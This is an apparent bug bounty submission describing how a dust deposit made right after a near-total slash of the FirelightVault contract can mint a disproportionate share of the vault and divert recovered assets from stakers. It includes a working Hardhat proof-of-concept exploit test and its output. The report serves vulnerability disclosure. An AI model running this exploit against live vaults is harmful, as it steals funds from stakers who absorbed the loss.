# 90409 sc medium a slash collapses the share price to near zero and deposits reopen in the same transaction letting anyone mint the vault s entire future value for dust

**Submitted on Aug 24th 2026 at 21:25:17 UTC by @Oxidant for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90409
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Theft of unclaimed yield

## Description

## Brief/Intro

A near-total `payout()` collapses the share price without burning shares, and `approveCurrentAssessment` reopens deposits in the same transaction, so anyone can back-run it with a dust deposit and mint more shares than the entire pre-incident supply.

Recovered assets from incidents can be returned to the vault afterwards and premiums forwarded by `VaultRewardDistributor`, they are split pro-rata with the attacker.

In the attached PoC a 2 wei deposit takes 500 of 1000 recovered tokens and withdraws them, leaving the two stakers who absorbed the full loss with 250 each instead of 500; a larger dust position takes proportionally more.

## Vulnerability Details

A payout reduces `totalAssets()` without burning any shares. This behavior is intentional and is confirmed by the protocol documentation.

However, when a payout consumes nearly all of the vault's assets, `totalAssets()` can approach zero while `totalSupply()` remains unchanged. Because the vault does not override `_decimalsOffset()`, it inherits the default value of `0`, which provides only one virtual share and one virtual asset as protection against extreme share-price manipulation.

As a result, immediately after a near-total slash, even a dust-sized deposit can mint an extremely large number of shares relative to the existing supply.

The timing makes this exploitable. During `approveCurrentAssessment`, `_executePayout` performs the slash, and `_decreaseIncident` clears the vault's `hasActiveIncident` flag within the same transaction. Therefore, the restriction preventing deposits is removed in the same block in which the vault's share price collapses.

An attacker can back-run this transaction and deposit a dust amount, for example 2 wei of USDC, receiving a disproportionately large share of the vault.

The documentation describes two possible ways the vault may later recover from the incident:

* **Recovered assets**: Assets recovered after a payout through white-hat returns, law-enforcement action, or protocol-level recovery are returned to the vault, with stakers being repaid before the remaining amount is allocated to the first-loss buffer.
* **Increased emissions**: The protocol may temporarily increase the base emission rate to attract additional capital to the vault.

In the first case, the attacker benefits disproportionately from any recovered assets because the dust deposit gave them a much larger share of the vault than their economic contribution should justify. This allows the attacker to capture part of the recovery that was intended to compensate the stakers who actually absorbed the incident loss.

In the second case, the attacker similarly receives a disproportionate portion of future emissions because those rewards are distributed while the attacker controls an abnormally large percentage of the vault's shares.

This creates a strong incentive to monitor and back-run incident transactions that nearly or completely slash a vault. By depositing a negligible amount immediately after the slash, an attacker can obtain a disproportionately large ownership position and profit from any subsequent recovery or incentive emissions.

## Impact Details

A near-total payout can collapse the vault's share price while leaving the existing share supply unchanged. This allows an attacker to deposit a negligible amount immediately after the incident is cleared and mint a disproportionately large number of shares.

The attacker can then capture an outsized portion of any future value returned to the vault, despite contributing almost no capital. This includes assets recovered after the incident through white-hat returns, law-enforcement recovery, or protocol-level recovery, as well as additional value distributed through temporarily increased emissions.

As a result, value intended to restore losses suffered by existing stakers can instead be redirected to an attacker who entered only after the loss occurred. The greater the slash and the closer totalAssets() gets to zero, the more severe the dilution becomes.

In the extreme case, a dust-sized deposit can give the attacker ownership comparable to or greater than that of pre-incident stakers, allowing them to capture a significant portion of subsequent vault recoveries and rewards without having participated in the original loss.

## Proof of Concept

## Proof of Concept

To reproduce this test;

1. Create the test file, `backrun_attack.js`, inside `test/` directory.
2. Paste the code below.
3. `npx hardhat test test/backrun_attack.js`

```solidity
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')
const { ethers } = require('hardhat')

describe('FirelightVault dust deposit back-running a payout', function () {
  const DECIMALS = 6
  const STAKE = ethers.parseUnits('1000', DECIMALS)     // alice and bob each
  const RECOVERED = ethers.parseUnits('1000', DECIMALS) // assets recovered after the incident
  const DUST = 2n                                       // the attacker's 2 wei
  const BPS = 10_000n

  const Fixture = async () => {
    const ctx = await deployVault({ decimals: DECIMALS })

    const CHECKPOINT_ROLE = await ctx.firelight_vault.CHECKPOINT_ROLE()
    await ctx.firelight_vault.connect(ctx.deployer).grantRole(CHECKPOINT_ROLE, ctx.deployer.address)

    return { ...ctx, alice: ctx.users[0], bob: ctx.users[1], attacker: ctx.users[2] }
  }

  // Drives the vault to the state the report starts from: two stakers funded it, an incident
  // is open (deposits blocked), and the payout has drained everything but 1 wei without
  // burning a single share.
  const runIncident = async (ctx) => {
    const { firelight_vault, deployer, incident, payout_signer, payout_receiver, utils, alice, bob } = ctx

    await utils.mintAndApprove(STAKE, alice)
    await firelight_vault.connect(alice).deposit(STAKE, alice.address)
    await utils.mintAndApprove(STAKE, bob)
    await firelight_vault.connect(bob).deposit(STAKE, bob.address)

    const supply_before_payout = await firelight_vault.totalSupply()
    expect(await firelight_vault.totalAssets()).to.equal(STAKE * 2n)

    // Roll onto the next period boundary and checkpoint
    const period_start = await firelight_vault.currentPeriodEnd()
    await time.setNextBlockTimestamp(period_start)
    await expect(firelight_vault.connect(deployer).checkpointTotalAssets())
      .to.emit(firelight_vault, 'TotalAssetsCheckpointed')
      .withArgs(STAKE * 2n)

    const capture_timestamp = await firelight_vault.currentPeriodStart()
    const capture_period = await firelight_vault.currentPeriod()
    expect(capture_timestamp).to.equal(period_start)
    expect(await firelight_vault.totalAssetsAt(capture_timestamp)).to.equal(STAKE * 2n)

    // Incident raised. IncidentManager calls this to block deposits while
    // the assessment is under evaluation.
    await firelight_vault.connect(incident).setActiveIncident(capture_period, true)

    // The claim is settled out of the vault.
    const payout_amount = STAKE * 2n - 1n
    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, payout_amount, capture_timestamp))
      .to.emit(firelight_vault, 'PayoutExecuted')
      .withArgs(payout_receiver.address, payout_amount, payout_amount, capture_timestamp)

    // Share price has collapsed: 2000 tokens of supply backed by 1 wei.
    expect(await firelight_vault.totalAssets()).to.equal(1n)
    expect(await firelight_vault.totalSupply()).to.equal(supply_before_payout)

    return { supply_before_payout, capture_period }
  }

  it('lets a 2 wei back-run take half of the assets recovered for the slashed stakers', async () => {
    const ctx = await loadFixture(Fixture)
    const { token_contract, firelight_vault, incident, utils, config, alice, bob, attacker } = ctx

    const { supply_before_payout, capture_period } = await runIncident(ctx)

    // While the incident is open the attacker cannot get in.
    await utils.mintAndApprove(DUST, attacker)
    await expect(firelight_vault.connect(attacker).deposit(DUST, attacker.address))
      .to.be.revertedWithCustomError(firelight_vault, 'CurrentPeriodHasActiveIncident')

    // approveCurrentAssessment runs _executePayout and then _decreaseIncident, which clears this
    // flag, in a single transaction. The deposit window therefore
    // opens in the same block the share price collapses in, and nothing gates it.
    await firelight_vault.connect(incident).setActiveIncident(capture_period, false)

    // The back-run attacker deposits 2 wei.
    await firelight_vault.connect(attacker).deposit(DUST, attacker.address)

    const attacker_shares = await firelight_vault.balanceOf(attacker.address)
    const total_supply = await firelight_vault.totalSupply()

    // 2 wei out-mints the entire 2000 token pre-incident supply.
    expect(attacker_shares).to.be.gt(supply_before_payout)
    expect((attacker_shares * BPS) / total_supply).to.equal(5000n)

    // Recovery: assets returned to the vault to make the slashed stakers whole. Donated, so no
    // shares are minted and the value is split pro-rata across the supply the attacker now owns
    // half of. (as in VaultRewardDistributor)
    await token_contract.mintTo(firelight_vault.target, RECOVERED)

    const attacker_value = await firelight_vault.convertToAssets(attacker_shares)
    const alice_value = await firelight_vault.convertToAssets(await firelight_vault.balanceOf(alice.address))
    const bob_value = await firelight_vault.convertToAssets(await firelight_vault.balanceOf(bob.address))

    // The attacker takes half the recovery for 2 wei. Alice and bob, who absorbed the entire
    // loss, are left splitting the other half: 250 tokens each instead of 500.
    expect(attacker_value).to.be.gte(RECOVERED / 2n)
    expect(alice_value).to.equal(RECOVERED / 4n)
    expect(bob_value).to.equal(RECOVERED / 4n)

    // the attacker redeems and extracts assets.
    const redeem_period = (await firelight_vault.currentPeriod()) + 1n
    await firelight_vault.connect(attacker).redeem(attacker_shares, attacker.address, attacker.address)

    await time.increase(config.period_configuration_duration * 2)
    await firelight_vault.connect(attacker).claimWithdraw(redeem_period)

    const attacker_balance = await token_contract.balanceOf(attacker.address)
    expect(attacker_balance).to.be.gte(RECOVERED / 2n)

    expect(attacker_balance / DUST).to.be.gt(250_000_000n)
  })

  it('control: with no back-run the recovery goes entirely to the slashed stakers', async () => {
    const ctx = await loadFixture(Fixture)
    const { token_contract, firelight_vault, incident, alice, bob } = ctx

    const { capture_period } = await runIncident(ctx)
    await firelight_vault.connect(incident).setActiveIncident(capture_period, false)

    // Same recovery, same vault, nobody back-ran the payout.
    await token_contract.mintTo(firelight_vault.target, RECOVERED)

    const alice_value = await firelight_vault.convertToAssets(await firelight_vault.balanceOf(alice.address))
    const bob_value = await firelight_vault.convertToAssets(await firelight_vault.balanceOf(bob.address))

    // 500 tokens each: exactly double what they get in the test above. Without attacker.
    expect(alice_value).to.equal(RECOVERED / 2n)
    expect(bob_value).to.equal(RECOVERED / 2n)
  })
})

```

## Output

```bash
$ npx hardhat test test/backrun_attack.js 

  FirelightVault dust deposit back-running a payout
    ✔ lets a 2 wei back-run take half of the assets recovered for the slashed stakers (742ms)
    ✔ control: with no back-run the recovery goes entirely to the slashed stakers
  2 passing (779ms)
```
